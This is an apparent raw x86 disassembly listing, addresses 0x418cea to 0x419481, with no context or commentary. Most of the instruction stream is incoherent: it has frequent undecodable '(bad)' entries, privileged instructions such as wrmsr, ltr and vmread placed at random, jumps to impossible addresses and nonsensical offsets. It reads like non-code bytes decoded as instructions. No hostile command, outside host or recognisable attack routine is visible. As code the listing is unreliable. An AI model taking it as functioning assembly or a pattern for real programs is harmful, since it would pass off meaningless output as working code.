  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
  418f6a:	mov    edi,DWORD PTR [ecx-0x78]
  418f6d:	ltr    WORD PTR [ecx-0x7b]
  418f71:	dec    DWORD PTR [edi]
  418f73:	clc    
  418f74:	out    0x45,eax
  418f76:	add    BYTE PTR [eax],cl
  418f78:	cmp    ebx,0xffffff8c
  418f7b:	jge    0x418f7d
  418f7d:	jb     0x418f8f
  418f7f:	je     0x508fff
  418f85:	pop    edx
  418f86:	push   esi
  418f87:	mov    ecx,DWORD PTR [edi]
  418f89:	in     al,dx
  418f8a:	rol    DWORD PTR [ebp+0x0],1
  418f8d:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  418f94:	cmp    DWORD PTR [ecx],0xfffffff0
  418f97:	hlt    
  418f98:	mov    esp,DWORD PTR [eax+0xf034d2b]
  418f9e:	(bad)  
  418fa0:	push   eax
  418fa1:	jns    0xb841741f
  418fa7:	lock push cs
  418fa9:	ror    edx,0x3
  418fac:	test   BYTE PTR [ecx+0x5500e800],cl
  418fb2:	dec    eax
  418fb3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  418fb7:	(bad)  
  418fb8:	mov    esi,0x7f33ff5f
  418fbd:	inc    eax
  418fbe:	test   DWORD PTR [edx],eax
  418fc0:	je     0x418f82
  418fc2:	mov    ecx,ecx
  418fc4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  418fc8:	and    eax,DWORD PTR [eax+0xf0103]
  418fce:	jp     0x418fbc
  418fd0:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  418fd4:	add    edx,DWORD PTR [edi+0x74]
  418fd7:	sbb    BYTE PTR [ebp+0x4d001484],cl
  418fdd:	add    BYTE PTR [ebp-0x74c48bbb],al
  418fe3:	je     0x418f68
  418fe5:	cmp    eax,edi
  418fe7:	js     0x41900c
  418fe9:	add    eax,0xeb0fc003
  418fee:	jns    0x418f7b
  418ff0:	vmread DWORD PTR [ecx+0x45],ebx
  418ff4:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  418ffa:	adc    al,0x8b
  418ffc:	jge    0x419012
  418ffe:	mov    edi,DWORD PTR [eax-0x4]
  419001:	add    edi,DWORD PTR [edi]
  419003:	or     bh,bh
  419005:	push   ebp
  419006:	push   es
  419007:	mov    DWORD PTR [ebp-0x4],ebx
  41900a:	add    edi,esi
  41900c:	pop    es
  41900d:	add    esi,DWORD PTR [edi-0x48ccf183]
  419013:	mov    DWORD PTR [esp+esi*8],ecx
  419016:	inc    ebp
  419017:	pop    ebp
  419018:	xor    DWORD PTR [esi-0x4],0x3b
  41901c:	add    edx,DWORD PTR [ecx+edi*1]
  41901f:	push   es
  419020:	clc    
  419021:	mov    bh,0xdb
  419023:	jp     0x418fdc
  419025:	add    cl,BYTE PTR [esi]
  419027:	div    DWORD PTR [edi+0x4d8b0c1c]
  41902d:	test   edi,edi
  41902f:	je     0x419025
  419031:	mov    eax,ecx
  419033:	or     BYTE PTR [ebx],al
  419035:	dec    BYTE PTR [ecx+0x7d3bec7d]
  41903b:	jbe    0x4190af
  41903d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  419043:	add    ecx,DWORD PTR [esi]
  419045:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  41904b:	add    eax,DWORD PTR [ebx-0x287af783]
  419051:	je     0x4190a0
  419053:	mov    DWORD PTR [ecx],edi
  419055:	mov    esi,eax
  419057:	hlt    
  419058:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  41905f:	jb     0x419021
  419061:	jmp    0x41904e
  419063:	xor    esi,DWORD PTR [ebx]
  419065:	pop    edi
  419066:	pop    esi
  419067:	pop    ebx
  419068:	ret    
  419069:	ret    0x8b
  41906c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  419072:	xor    DWORD PTR [ecx],0xc
  419075:	pushf  
  419076:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  41907c:	wrmsr  
  41907e:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  419085:	dec    ebp
  419086:	ret    
  419087:	mov    edi,DWORD PTR [esi-0x4]
  41908a:	pop    eax
  41908b:	dec    ebp
  41908c:	jne    0x419019
  41908e:	xor    edi,esp
  419090:	inc    eax
  419091:	dec    ebp
  419092:	jbe    0x4190e7
  419094:	inc    eax
  419095:	pop    ebp
  419096:	add    edx,DWORD PTR [esi+0x8]
  419099:	push   ebp
  41909a:	dec    eax
  41909b:	push   ecx
  41909c:	mov    eax,edi
  41909e:	and    al,0xf0
  4190a0:	jo     0x41908d
  4190a2:	mov    eax,DWORD PTR [ebx]
  4190a4:	sbb    BYTE PTR [ebp+0x4d],cl
  4190a7:	mov    eax,DWORD PTR [ebx]
  4190a9:	nop
  4190aa:	or     BYTE PTR [eax],al
  4190ac:	jne    0x419105
  4190ae:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  4190b5:	xor    edi,edi
  4190b7:	add    edi,DWORD PTR [ebp+0x3]
  4190ba:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4190c0:	js     0x419046
  4190c2:	jae    0x4190c6
  4190c4:	(bad)  
  4190c6:	xor    al,0x5d
  4190c8:	jmp    0x419055
  4190ca:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4190d1:	fdecstp 
  4190d3:	test   BYTE PTR [edi],ah
  4190d5:	add    bh,BYTE PTR [ebp+0x0]
  4190d8:	add    ebx,DWORD PTR [ebp-0x77]
  4190db:	mov    edi,eax
  4190dd:	cmp    al,0x0
  4190e0:	adc    dh,BYTE PTR [ebx]
  4190e2:	jge    0x4190e7
  4190e4:	mov    edi,DWORD PTR [ebx]
  4190e6:	jl     0x4190f7
  4190e8:	clc    
  4190e9:	dec    edi
  4190ea:	jge    0x4190ec
  4190ec:	mov    eax,DWORD PTR [ebx]
  4190ee:	jb     0x4190f8
  4190f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4190f3:	mov    edi,edi
  4190f5:	xor    edx,DWORD PTR [eax]
  4190f7:	add    edi,DWORD PTR [ebx]
  4190f9:	mov    DWORD PTR [ebp-0x10],edi
  4190fc:	inc    edi
  4190fd:	pop    ebp
  4190fe:	jge    0x41913b
  419100:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  419104:	mov    edx,0xc05d87f0
  419109:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  41910d:	fimul  WORD PTR [eax]
  41910f:	fist   WORD PTR [ebp+0x1c]
  419112:	in     al,dx
  419113:	jne    0x419101
  419115:	mov    edi,DWORD PTR [edx-0x7a27a10]
  41911b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  41911f:	fdivp  st(0),st
  419121:	fild   WORD PTR [ebp+0x4510f85c]
  419127:	test   BYTE PTR [ebx+0x4d00fc02],cl
  41912d:	inc    ebp
  41912e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  419134:	mov    ebp,DWORD PTR [ebx-0x4]
  419137:	adc    al,0x8b
  419139:	rcl    DWORD PTR [eax],0x48
  41913c:	mov    esi,0x7080803
  419141:	fiadd  WORD PTR [ebp+0x4d]
  419144:	(bad)  
  419145:	mov    edx,DWORD PTR [edx-0x4]
  419148:	mov    edx,DWORD PTR [ebp-0x4]
  41914b:	xor    ebx,DWORD PTR [ebx+0x330103]
  419151:	mov    DWORD PTR [edi+0x872dc],edi
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	into   
  419159:	ffreep st(6)
  41915b:	retf   0x6c7
  41915e:	iret   
  41915f:	dec    ebp
  419160:	inc    ebp
  419161:	mov    DWORD PTR [ebx],edi
  419163:	fmul   QWORD PTR [edi]
  419165:	dec    ebp
  419166:	jnp    0x41919b
  419168:	add    BYTE PTR [ebx],al
  41916a:	mov    ecx,DWORD PTR [esp+edi*8]
  41916d:	inc    ebp
  41916e:	dec    ebp
  41916f:	lea    esi,[ebx]
  419171:	add    DWORD PTR [ebx],eax
  419173:	jb     0x4191b0
  419175:	add    BYTE PTR [edi],cl
  419177:	inc    ebp
  419178:	imul   eax,edi,0x858bd800
  41917e:	cld    
  41917f:	clc    
  419180:	mov    DWORD PTR [ebp+0x0],eax
  419183:	inc    DWORD PTR [eax]
  419185:	or     al,0xde
  419187:	sbb    bh,0x1
  41918a:	retf   
  41918b:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  419192:	dec    ebp
  419193:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  419199:	enter  0x12de,0xdf
  41919d:	inc    ebp
  41919e:	pop    ebp
  41919f:	dec    DWORD PTR [ebx-0x257f0ff4]
  4191a5:	add    DWORD PTR [edx],edx
  4191a7:	add    BYTE PTR [ebp+0x50],dl
  4191aa:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4191b0:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  4191b6:	or     ah,al
  4191b8:	pop    ss
  4191b9:	cdq    
  4191ba:	push   ebp
  4191bb:	clc    
  4191bc:	mov    eax,DWORD PTR [ebp-0x4]
  4191bf:	xor    edx,edx
  4191c1:	add    esi,DWORD PTR [ebx]
  4191c3:	cmp    eax,DWORD PTR [ebx]
  4191c5:	hlt    
  4191c6:	cmp    DWORD PTR [ebx],esp
  4191c8:	or     al,BYTE PTR [ebp+0xf]
  4191cb:	mov    eax,DWORD PTR [edx]
  4191cd:	loopne 0x4191cf
  4191cf:	(bad)  
  4191d0:	mov    ecx,esi
  4191d2:	cld    
  4191d3:	pushf  
  4191d4:	pop    ebp
  4191d5:	pushf  
  4191d6:	mov    esi,DWORD PTR [edx]
  4191d8:	lock mov eax,eax
  4191db:	adc    BYTE PTR [ebx],al
  4191dd:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4191e4:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4191ea:	dec    ebp
  4191eb:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4191f1:	(bad)  
  4191f2:	iret   
  4191f3:	inc    ebp
  4191f4:	(bad)  
  4191f5:	jne    0x419244
  4191f7:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4191fd:	(bad)  
  4191fe:	cmp    ebx,eax
  419200:	je     0x419188
  419202:	add    edi,edi
  419204:	or     bh,bh
  419206:	dec    ebp
  419207:	inc    ebp
  419208:	mov    esi,DWORD PTR [ebx]
  41920a:	cld    
  41920b:	add    ecx,esi
  41920d:	cmp    ecx,DWORD PTR [eax-0xc]
  419210:	mov    edx,DWORD PTR [edi]
  419212:	or     BYTE PTR [ebp-0x7c],al
  419215:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  41921c:	or     al,0x9c
  41921e:	inc    ebp
  41921f:	xor    bh,BYTE PTR [ecx+ecx*4]
  419222:	pushf  
  419223:	call   0x5281b3
  419228:	jne    0x4191f1
  41922a:	mov    ebp,esp
  41922c:	fcomp  DWORD PTR [ebx]
  41922e:	add    BYTE PTR [ecx],al
  419230:	inc    DWORD PTR [ebp-0x75]
  419233:	(bad)  
  419234:	cld    
  419235:	add    al,0xce
  419237:	mov    ecx,edi
  419239:	cld    
  41923a:	inc    ebp
  41923b:	fidivr WORD PTR [ebx]
  41923d:	fbstp  TBYTE PTR [ebp-0x3e]
  419240:	mov    eax,DWORD PTR [eax]
  419242:	adc    BYTE PTR [ebx-0x3974038b],cl
  419248:	fadd   st,st(7)
  41924a:	add    BYTE PTR [ebp-0x1],al
  41924d:	mov    ecx,DWORD PTR [esp+edi*8]
  419250:	inc    ebp
  419251:	mov    bh,0xc7
  419254:	loopne 0x41929b
  419256:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  41925c:	sbb    BYTE PTR [ebx],dh
  41925e:	pushf  
  41925f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  419265:	mov    eax,edi
  419267:	cwde   
  419268:	inc    ebp
  419269:	inc    ebp
  41926a:	jne    0x4191f7
  41926c:	mov    esp,esp
  41926e:	clc    
  41926f:	add    al,0x4d
  419271:	mov    DWORD PTR [ebx],esi
  419273:	or     al,0x33
  419275:	inc    ebp
  419276:	lea    ecx,[ebx-0x398d13fd]
  41927c:	add    bh,al
  41927e:	inc    ebp
  41927f:	ror    DWORD PTR [ebx+0x45d829],0x8b
  419286:	add    ebp,esp
  419288:	shufps xmm1,xmm3,0xc7
  41928c:	(bad)  
  41928d:	jmp    0x7486cdb6
  419292:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  419298:	hlt    
  419299:	mov    ecx,DWORD PTR [edi]
  41929b:	fadd   DWORD PTR [ebp+0x0]
  41929e:	xor    ecx,DWORD PTR [edi]
  4192a0:	add    ecx,ecx
  4192a2:	cmp    edi,edi
  4192a4:	pmuludq mm7,QWORD PTR [edx+0x50]
  4192a8:	(bad)  
  4192a9:	jmp    0x419236
  4192ab:	mov    edi,esp
  4192ad:	or     al,0xc6
  4192af:	inc    ebp
  4192b0:	(bad)  
  4192b1:	mov    eax,DWORD PTR [ebp+0x10]
  4192b4:	jne    0x41923f
  4192b6:	mov    eax,DWORD PTR [ecx]
  4192b8:	clc    
  4192b9:	add    BYTE PTR [ebp-0x40],cl
  4192bc:	xor    edx,DWORD PTR [eax-0x73]
  4192bf:	jne    0x4192c2
  4192c1:	push   DWORD PTR [edx+0x8]
  4192c4:	add    BYTE PTR [ebp+0x45],al
  4192c7:	mov    ebp,ecx
  4192c9:	cld    
  4192ca:	add    BYTE PTR [ebp+0x0],cl
  4192cd:	xor    eax,DWORD PTR [ebp+0x3]
  4192d0:	mov    DWORD PTR [ebx],edi
  4192d2:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  4192d8:	sub    eax,0x5d330e4d
  4192dd:	lea    esi,[ebx]
  4192df:	add    DWORD PTR [ebx],eax
  4192e1:	jb     0x4192cc
  4192e3:	add    BYTE PTR [eax],al
  4192e5:	inc    ebp
  4192e6:	add    bl,ch
  4192e8:	inc    ebp
  4192e9:	mov    esi,DWORD PTR [ebx]
  4192eb:	or     al,0x3
  4192ed:	(bad)  
  4192ee:	mov    edi,eax
  4192f0:	in     al,dx
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	inc    ebp
  4192f3:	mov    esi,DWORD PTR [ebx]
  4192f5:	in     al,0x3
  4192f7:	add    al,0x89
  4192f9:	mov    ecx,DWORD PTR [eax+edi*8]
  4192fc:	dec    ebp
  4192fd:	(bad)  
  4192fe:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  419305:	mov    ecx,eax
  419307:	cld    
  419308:	push   es
  419309:	dec    ebp
  41930a:	add    al,0x33
  41930c:	mov    DWORD PTR [ebx],eax
  41930e:	in     al,dx
  41930f:	cmp    DWORD PTR [ebp-0x67],eax
  419312:	mov    eax,DWORD PTR [ebp-0xba0068]
  419318:	mov    edx,DWORD PTR [ebp-0x4]
  41931b:	mov    ecx,DWORD PTR [ebp-0x18]
  41931e:	xor    ecx,DWORD PTR [ebp+0x3]
  419321:	cmp    DWORD PTR [ebx],0x8b32749b
  419327:	xor    edi,esp
  419329:	jmp    0xff75907b
  41932e:	add    ecx,DWORD PTR [ebp-0x3f]
  419331:	xor    ebx,DWORD PTR [edi]
  419333:	add    eax,ecx
  419335:	cmp    ebx,DWORD PTR [eax]
  419337:	mov    ecx,DWORD PTR [ebp-0x4]
  41933a:	mov    ecx,DWORD PTR [eax]
  41933c:	adc    BYTE PTR [ebp-0x80],al
  41933f:	jmp    0x419342
  419341:	mov    eax,DWORD PTR [eax]
  419343:	cld    
  419344:	mov    bh,0xc6
  419346:	push   ecx
  419347:	(bad)  
  419348:	jne    0x4193a8
  41934a:	dec    ecx
  41934c:	or     BYTE PTR [ecx+ebx*1],cl
  41934f:	push   ebp
  419350:	inc    ebp
  419351:	in     al,dx
  419352:	add    ebp,esp
  419354:	or     bh,al
  419356:	dec    ebp
  419357:	cld    
  419358:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  41935e:	xor    DWORD PTR [eax],0x2
  419361:	pushf  
  419362:	dec    DWORD PTR [ebx+0x45510cf4]
  419368:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  41936e:	mov    edx,DWORD PTR [ecx+0xc]
  419371:	xor    eax,esi
  419373:	mov    edx,0xc172c7
  419378:	inc    ebp
  419379:	mov    esi,DWORD PTR [ebp+0x8]
  41937c:	mov    eax,edx
  41937e:	call   0x84c65a73
  419383:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  41938a:	call   0x4db1a397
  41938f:	push   edi
  419390:	xor    esi,DWORD PTR [ebp+0x3]
  419393:	(bad)  
  419394:	pmulhuw mm0,mm1
  419397:	test   DWORD PTR [ebp-0x8],ecx
  41939a:	mov    DWORD PTR [ebp-0x67],eax
  41939d:	mov    eax,DWORD PTR [ebp-0x4]
  4193a0:	xor    edi,DWORD PTR [ebp-0x73]
  4193a3:	xor    eax,DWORD PTR [ebx]
  4193a5:	xor    esi,DWORD PTR [edx+0x3]
  4193a8:	add    BYTE PTR [ecx],bh
  4193aa:	inc    ebp
  4193ab:	(bad)  
  4193ac:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  4193b2:	mov    DWORD PTR [eax],0x750f0004
  4193b8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  4193be:	lock add BYTE PTR [ebp+0x0],al
  4193c2:	mov    esi,DWORD PTR [ebp-0x2c]
  4193c5:	mov    ebp,edx
  4193c7:	or     al,0x72
  4193c9:	ja     0x4193cb
  4193cb:	mov    edx,esi
  4193cd:	cld    
  4193ce:	(bad)  
  4193d1:	cli    
  4193d2:	mov    esi,DWORD PTR [ebp-0x4]
  4193d5:	cmp    ecx,esi
  4193d7:	bswap  edi
  4193d9:	(bad)
  4193dd:	mov    esi,DWORD PTR [ebp-0x4]
  4193e0:	mov    esi,ecx
  4193e2:	clc    
  4193e3:	repnz add esi,DWORD PTR [ebp+0x45]
  4193e7:	push   ebx
  4193e8:	xor    eax,DWORD PTR [ebp+0x3]
  4193eb:	xor    bl,BYTE PTR [edi-0x64]
  4193ee:	pop    ebx
  4193ef:	jmp    0x4194b6
  4193f4:	mov    esi,DWORD PTR [ebp-0x7d]
  4193f7:	xor    ebp,DWORD PTR [eax]
  4193f9:	lea    eax,[ebp-0x8]
  4193fc:	xor    edx,esi
  4193fe:	pushf  
  4193ff:	out    dx,eax
  419400:	(bad)  
  419401:	neg    eax
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	test   esi,edi
  419406:	clc    
  419407:	pop    esp
  419408:	inc    ebp
  419409:	or     BYTE PTR [ecx+0x450f0c7d],cl
  41940f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  419415:	add    cl,al
  419417:	jne    0x4193b5
  419419:	mov    esi,DWORD PTR [edx]
  41941b:	in     al,dx
  41941c:	push   esi
  41941d:	xor    BYTE PTR [ebp-0xe],dh
  419420:	add    edi,esi
  419422:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  419428:	add    cl,bh
  41942a:	mov    edi,DWORD PTR [ebp+0x8]
  41942d:	mov    DWORD PTR [ebp-0x14],esi
  419430:	add    esi,DWORD PTR [ebp+0x3c]
  419433:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  419439:	mov    ah,0x3c
  41943b:	pushf  
  41943c:	pushf  
  41943d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  419443:	jne    0x4193d0
  419445:	mov    ecx,DWORD PTR [esp+ebp*8]
  419448:	icebp  
  419449:	icebp  
  41944a:	shl    edx,0xf2
  41944d:	(bad)  
  41944e:	mov    ah,0x16
  419450:	pop    eax
  419451:	jne    0x4193e6
  419453:	mov    ecx,DWORD PTR [edi]
  419455:	in     al,dx
  419456:	jmp    0x419449
  419458:	add    dl,dh
  41945a:	mov    edi,esi
  41945c:	or     al,0x8
  41945e:	inc    ebp
  41945f:	jne    0x419464
  419461:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  419467:	ret    
  419468:	or     bh,bh
  41946a:	jge    0x419454
  41946c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  419472:	xor    edi,eax
  419474:	add    esi,DWORD PTR [ebp-0x77]
  419477:	mov    ebx,esp
  419479:	clc    
  41947a:	neg    DWORD PTR [ebp-0x7c]
  41947d:	xor    eax,DWORD PTR [eax]
  41947f:	cmp    eax,DWORD PTR [eax]
  419481:	repz jne 0x419419
